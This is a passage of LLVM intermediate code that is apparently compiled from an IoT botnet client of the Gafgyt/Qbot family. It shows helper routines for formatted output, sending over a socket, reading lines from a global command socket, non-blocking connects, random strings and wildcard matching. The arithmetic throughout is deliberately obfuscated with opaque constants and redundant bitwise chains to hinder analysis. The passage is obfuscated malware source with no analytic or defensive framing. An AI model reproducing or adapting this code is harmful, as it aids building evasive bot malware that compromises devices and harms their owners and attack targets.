  %98 = getelementptr inbounds i8, i8* %97, i32 1
  store i8* %98, i8** %6, align 8
  br label %81

; <label>:99:                                     ; preds = %81
  br label %100

; <label>:100:                                    ; preds = %110, %99
  %101 = load i32, i32* %7, align 4
  %102 = icmp sgt i32 %101, 0
  br i1 %102, label %103, label %117

; <label>:103:                                    ; preds = %100
  %104 = load i8**, i8*** %5, align 8
  %105 = load i32, i32* %10, align 4
  call void @printchar(i8** %104, i32 %105)
  %106 = load i32, i32* %9, align 4
  %107 = sub i32 0, 1
  %108 = sub i32 %106, %107
  %109 = add nsw i32 %106, 1
  store i32 %108, i32* %9, align 4
  br label %110

; <label>:110:                                    ; preds = %103
  %111 = load i32, i32* %7, align 4
  %112 = sub i32 0, %111
  %113 = sub i32 0, -1
  %114 = add i32 %112, %113
  %115 = sub i32 0, %114
  %116 = add nsw i32 %111, -1
  store i32 %115, i32* %7, align 4
  br label %100

; <label>:117:                                    ; preds = %100
  %118 = load i32, i32* %9, align 4
  ret i32 %118
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %132

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %48

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %48

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %48

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub i32 0, 1138396270
  %45 = sub i32 %44, %43
  %46 = add i32 %45, 1138396270
  %47 = sub nsw i32 0, %43
  store i32 %46, i32* %21, align 4
  br label %48

; <label>:48:                                     ; preds = %42, %39, %36, %33
  %49 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %50 = getelementptr inbounds i8, i8* %49, i64 12
  %51 = getelementptr inbounds i8, i8* %50, i64 -1
  store i8* %51, i8** %17, align 8
  %52 = load i8*, i8** %17, align 8
  store i8 0, i8* %52, align 1
  br label %53

; <label>:53:                                     ; preds = %76, %48
  %54 = load i32, i32* %21, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %89

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* %21, align 4
  %58 = load i32, i32* %11, align 4
  %59 = urem i32 %57, %58
  store i32 %59, i32* %18, align 4
  %60 = load i32, i32* %18, align 4
  %61 = icmp sge i32 %60, 10
  br i1 %61, label %62, label %76

; <label>:62:                                     ; preds = %56
  %63 = load i32, i32* %15, align 4
  %64 = sub i32 0, 48
  %65 = add i32 %63, %64
  %66 = sub nsw i32 %63, 48
  %67 = sub i32 %65, -862024234
  %68 = sub i32 %67, 10
  %69 = add i32 %68, -862024234
  %70 = sub nsw i32 %65, 10
  %71 = load i32, i32* %18, align 4
  %72 = add i32 %71, 1270240344
  %73 = add i32 %72, %69
  %74 = sub i32 %73, 1270240344
  %75 = add nsw i32 %71, %69
  store i32 %74, i32* %18, align 4
  br label %76

; <label>:76:                                     ; preds = %62, %56
  %77 = load i32, i32* %18, align 4
  %78 = sub i32 0, %77
  %79 = sub i32 0, 48
  %80 = add i32 %78, %79
  %81 = sub i32 0, %80
  %82 = add nsw i32 %77, 48
  %83 = trunc i32 %81 to i8
  %84 = load i8*, i8** %17, align 8
  %85 = getelementptr inbounds i8, i8* %84, i32 -1
  store i8* %85, i8** %17, align 8
  store i8 %83, i8* %85, align 1
  %86 = load i32, i32* %11, align 4
  %87 = load i32, i32* %21, align 4
  %88 = udiv i32 %87, %86
  store i32 %88, i32* %21, align 4
  br label %53

; <label>:89:                                     ; preds = %53
  %90 = load i32, i32* %19, align 4
  %91 = icmp ne i32 %90, 0
  br i1 %91, label %92, label %122

; <label>:92:                                     ; preds = %89
  %93 = load i32, i32* %13, align 4
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %95, label %118

; <label>:95:                                     ; preds = %92
  %96 = load i32, i32* %14, align 4
  %97 = xor i32 %96, -1
  %98 = xor i32 2, -1
  %99 = xor i32 -1616190102, -1
  %100 = or i32 %97, %98
  %101 = or i32 -1616190102, %99
  %102 = xor i32 %100, -1
  %103 = and i32 %102, %101
  %104 = and i32 %96, 2
  %105 = icmp ne i32 %103, 0
  br i1 %105, label %106, label %118

; <label>:106:                                    ; preds = %95
  %107 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %107, i32 45)
  %108 = load i32, i32* %20, align 4
  %109 = sub i32 %108, 1681424120
  %110 = add i32 %109, 1
  %111 = add i32 %110, 1681424120
  %112 = add nsw i32 %108, 1
  store i32 %111, i32* %20, align 4
  %113 = load i32, i32* %13, align 4
  %114 = sub i32 %113, 1883582022
  %115 = add i32 %114, -1
  %116 = add i32 %115, 1883582022
  %117 = add nsw i32 %113, -1
  store i32 %116, i32* %13, align 4
  br label %121

; <label>:118:                                    ; preds = %95, %92
  %119 = load i8*, i8** %17, align 8
  %120 = getelementptr inbounds i8, i8* %119, i32 -1
  store i8* %120, i8** %17, align 8
  store i8 45, i8* %120, align 1
  br label %121

; <label>:121:                                    ; preds = %118, %106
  br label %122

; <label>:122:                                    ; preds = %121, %89
  %123 = load i32, i32* %20, align 4
  %124 = load i8**, i8*** %9, align 8
  %125 = load i8*, i8** %17, align 8
  %126 = load i32, i32* %13, align 4
  %127 = load i32, i32* %14, align 4
  %128 = call i32 @prints(i8** %124, i8* %125, i32 %126, i32 %127)
  %129 = sub i32 0, %128
  %130 = sub i32 %123, %129
  %131 = add nsw i32 %123, %128
  store i32 %130, i32* %8, align 4
  br label %132

; <label>:132:                                    ; preds = %122, %25
  %133 = load i32, i32* %8, align 4
  ret i32 %133
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #5
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #9
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.112, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #9
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #5
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %84 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %52
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %116

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %43

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %41

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  %31 = and i1 true, %30
  %32 = xor i1 true, true
  %33 = and i1 %29, %32
  %34 = xor i1 true, true
  %35 = and i1 %34, true
  %36 = and i1 true, %32
  %37 = or i1 %31, %33
  %38 = or i1 %35, %36
  %39 = xor i1 %37, %38
  %40 = xor i1 %29, true
  br label %41

; <label>:41:                                     ; preds = %24, %19
  %42 = phi i1 [ false, %19 ], [ %39, %24 ]
  br label %43

; <label>:43:                                     ; preds = %41, %13
  %44 = phi i1 [ true, %13 ], [ %42, %41 ]
  %45 = xor i1 %44, true
  %46 = and i1 true, %45
  %47 = xor i1 true, true
  %48 = and i1 %44, %47
  %49 = or i1 %46, %48
  %50 = xor i1 %44, true
  %51 = zext i1 %49 to i32
  store i32 %51, i32* %3, align 4
  br label %116

; <label>:52:                                     ; preds = %2
  %53 = load i8*, i8** %5, align 8
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %75

; <label>:57:                                     ; preds = %52
  %58 = load i8*, i8** %4, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 1
  %60 = load i8*, i8** %5, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 1
  %62 = call i32 @wildString(i8* %59, i8* %61)
  %63 = icmp ne i32 %62, 0
  %64 = xor i1 %63, true
  %65 = and i1 false, %64
  %66 = xor i1 false, true
  %67 = and i1 %63, %66
  %68 = xor i1 true, true
  %69 = and i1 %68, false
  %70 = and i1 true, %66
  %71 = or i1 %65, %67
  %72 = or i1 %69, %70
  %73 = xor i1 %71, %72
  %74 = xor i1 %63, true
  br label %75

; <label>:75:                                     ; preds = %57, %52
  %76 = phi i1 [ false, %52 ], [ %73, %57 ]
  %77 = xor i1 %76, true
  %78 = and i1 true, %77
  %79 = xor i1 true, true
  %80 = and i1 %76, %79
  %81 = or i1 %78, %80
  %82 = xor i1 %76, true
  %83 = zext i1 %81 to i32
  store i32 %83, i32* %3, align 4
  br label %116

; <label>:84:                                     ; preds = %2
  %85 = load i8*, i8** %4, align 8
  %86 = load i8, i8* %85, align 1
  %87 = zext i8 %86 to i32
  %88 = call i32 @toupper(i32 %87) #9
  %89 = load i8*, i8** %5, align 8
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  %92 = call i32 @toupper(i32 %91) #9
  %93 = icmp eq i32 %88, %92
  br i1 %93, label %94, label %107

; <label>:94:                                     ; preds = %84
  %95 = load i8*, i8** %4, align 8
  %96 = getelementptr inbounds i8, i8* %95, i64 1
  %97 = load i8*, i8** %5, align 8
  %98 = getelementptr inbounds i8, i8* %97, i64 1
  %99 = call i32 @wildString(i8* %96, i8* %98)
  %100 = icmp ne i32 %99, 0
  %101 = xor i1 %100, true
  %102 = and i1 true, %101
  %103 = xor i1 true, true
  %104 = and i1 %100, %103
  %105 = or i1 %102, %104
  %106 = xor i1 %100, true
  br label %107

; <label>:107:                                    ; preds = %94, %84
  %108 = phi i1 [ false, %84 ], [ %105, %94 ]
  %109 = xor i1 %108, true
  %110 = and i1 true, %109
  %111 = xor i1 true, true
  %112 = and i1 %108, %111
  %113 = or i1 %110, %112
  %114 = xor i1 %108, true
  %115 = zext i1 %113 to i32
  store i32 %115, i32* %3, align 4
  br label %116

; <label>:116:                                    ; preds = %107, %75, %43, %9
  %117 = load i32, i32* %3, align 4
  ret i32 %117
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #5
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %21, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %27

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = sub i32 0, 65
  %14 = sub i32 %12, %13
  %15 = add i32 %12, 65
  %16 = trunc i32 %14 to i8
  %17 = load i8*, i8** %3, align 8
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  store i8 %16, i8* %20, align 1
  br label %21

; <label>:21:                                     ; preds = %10
  %22 = load i32, i32* %5, align 4
  %23 = sub i32 %22, 1547982169
  %24 = add i32 %23, 1
  %25 = add i32 %24, 1547982169
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %5, align 4
  br label %6

; <label>:27:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #5, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = xor i64 %43, -1
  %45 = xor i64 %37, -1
  %46 = xor i64 -5397347450688656912, -1
  %47 = and i64 %44, -5397347450688656912
  %48 = and i64 %43, %46
  %49 = and i64 %45, -5397347450688656912
  %50 = and i64 %37, %46
  %51 = or i64 %47, %48
  %52 = or i64 %49, %50
  %53 = xor i64 %51, %52
  %54 = or i64 %44, %45
  %55 = xor i64 %54, -1
  %56 = or i64 -5397347450688656912, %46
  %57 = and i64 %55, %56
  %58 = or i64 %53, %57
  %59 = or i64 %43, %37
  store i64 %58, i64* %42, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sub i32 %60, 153212326
  %62 = add i32 %61, 1
  %63 = add i32 %62, 153212326
  %64 = add nsw i32 %60, 1
  %65 = call i32 @select(i32 %63, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %65, i32* %12, align 4
  %66 = icmp sle i32 %65, 0
  br i1 %66, label %67, label %124

; <label>:67:                                     ; preds = %33
  br label %68

; <label>:68:                                     ; preds = %116, %67
  %69 = load i32, i32* %13, align 4
  %70 = icmp slt i32 %69, 10
  br i1 %70, label %71, label %123

; <label>:71:                                     ; preds = %68
  %72 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %72, align 8
  %73 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %73, align 8
  br label %74

; <label>:74:                                     ; preds = %71
  %75 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %75, i64 0, i64 0
  %77 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %76) #5, !srcloc !3
  %78 = extractvalue { i64, i64* } %77, 0
  %79 = extractvalue { i64, i64* } %77, 1
  %80 = trunc i64 %78 to i32
  store i32 %80, i32* %14, align 4
  %81 = ptrtoint i64* %79 to i64
  %82 = trunc i64 %81 to i32
  store i32 %82, i32* %15, align 4
  br label %83

; <label>:83:                                     ; preds = %74
  %84 = load i32, i32* %5, align 4
  %85 = srem i32 %84, 64
  %86 = zext i32 %85 to i64
  %87 = shl i64 1, %86
  %88 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %89 = load i32, i32* %5, align 4
  %90 = sdiv i32 %89, 64
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds [16 x i64], [16 x i64]* %88, i64 0, i64 %91
  %93 = load i64, i64* %92, align 8
  %94 = xor i64 %93, -1
  %95 = xor i64 %87, -1
  %96 = xor i64 -5833324971974175551, -1
  %97 = and i64 %94, -5833324971974175551
  %98 = and i64 %93, %96
  %99 = and i64 %95, -5833324971974175551
  %100 = and i64 %87, %96
  %101 = or i64 %97, %98
  %102 = or i64 %99, %100
  %103 = xor i64 %101, %102
  %104 = or i64 %94, %95
  %105 = xor i64 %104, -1
  %106 = or i64 -5833324971974175551, %96
  %107 = and i64 %105, %106
  %108 = or i64 %103, %107
  %109 = or i64 %93, %87
  store i64 %108, i64* %92, align 8
  %110 = load i32, i32* %5, align 4
  %111 = sub i32 0, 1
  %112 = sub i32 %110, %111
  %113 = add nsw i32 %110, 1
  %114 = call i32 @select(i32 %112, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %114, i32* %12, align 4
  %115 = icmp sle i32 %114, 0
  br i1 %115, label %116, label %122

; <label>:116:                                    ; preds = %83
  %117 = load i32, i32* %13, align 4
  %118 = sub i32 %117, 1364014380
  %119 = add i32 %118, 1
  %120 = add i32 %119, 1364014380
  %121 = add nsw i32 %117, 1
  store i32 %120, i32* %13, align 4
  br label %68

; <label>:122:                                    ; preds = %83
  br label %123

; <label>:123:                                    ; preds = %122, %68
  br label %124

; <label>:124:                                    ; preds = %123, %33
  store i32 0, i32* %18, align 4
  %125 = load i8*, i8** %6, align 8
  store i8* %125, i8** %17, align 8
  br label %126

; <label>:126:                                    ; preds = %147, %124
  %127 = load i32, i32* %7, align 4
  %128 = sub i32 %127, -892872059
  %129 = add i32 %128, -1
  %130 = add i32 %129, -892872059
  %131 = add nsw i32 %127, -1
  store i32 %130, i32* %7, align 4
  %132 = icmp sgt i32 %127, 1
  br i1 %132, label %133, label %153

; <label>:133:                                    ; preds = %126
  %134 = load i32, i32* @mainCommSock, align 4
  %135 = call i64 @recv(i32 %134, i8* %16, i64 1, i32 0)
  %136 = icmp ne i64 %135, 1
  br i1 %136, label %137, label %139

; <label>:137:                                    ; preds = %133
  %138 = load i8*, i8** %17, align 8
  store i8 0, i8* %138, align 1
  store i32 -1, i32* %4, align 4
  br label %156

; <label>:139:                                    ; preds = %133
  %140 = load i8, i8* %16, align 1
  %141 = load i8*, i8** %17, align 8
  %142 = getelementptr inbounds i8, i8* %141, i32 1
  store i8* %142, i8** %17, align 8
  store i8 %140, i8* %141, align 1
  %143 = load i8, i8* %16, align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %144, 10
  br i1 %145, label %146, label %147

; <label>:146:                                    ; preds = %139
  br label %153

; <label>:147:                                    ; preds = %139
  %148 = load i32, i32* %18, align 4
  %149 = add i32 %148, -1369314123
  %150 = add i32 %149, 1
  %151 = sub i32 %150, -1369314123
  %152 = add nsw i32 %148, 1
  store i32 %151, i32* %18, align 4
  br label %126

; <label>:153:                                    ; preds = %146, %126
  %154 = load i8*, i8** %17, align 8
  store i8 0, i8* %154, align 1
  %155 = load i32, i32* %18, align 4
  store i32 %155, i32* %4, align 4
  br label %156

; <label>:156:                                    ; preds = %153, %137
  %157 = load i32, i32* %4, align 4
  ret i32 %157
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = and i64 %22, 2048
  %24 = xor i64 %22, 2048
  %25 = or i64 %23, %24
  %26 = or i64 %22, 2048
  store i64 %25, i64* %15, align 8
  %27 = load i32, i32* %6, align 4
  %28 = load i64, i64* %15, align 8
  %29 = call i32 (i32, i32, ...) @fcntl(i32 %27, i32 4, i64 %28)
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = load i32, i32* %8, align 4
  %32 = trunc i32 %31 to i16
  %33 = call zeroext i16 @htons(i16 zeroext %32) #10
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  %35 = load i8*, i8** %7, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %37 = call i32 @getHost(i8* %35, %struct.in_addr* %36)
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %39, label %40

; <label>:39:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %115

; <label>:40:                                     ; preds = %4
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %42 = getelementptr inbounds [8 x i8], [8 x i8]* %41, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 8, i32 4, i1 false)
  %43 = load i32, i32* %6, align 4
  %44 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %45 = call i32 @connect(i32 %43, %struct.sockaddr* %44, i32 16)
  store i32 %45, i32* %16, align 4
  %46 = load i32, i32* %16, align 4
  %47 = icmp slt i32 %46, 0
  br i1 %47, label %48, label %99

; <label>:48:                                     ; preds = %40
  %49 = call i32* @__errno_location() #10
  %50 = load i32, i32* %49, align 4
  %51 = icmp eq i32 %50, 115
  br i1 %51, label %52, label %97

; <label>:52:                                     ; preds = %48
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
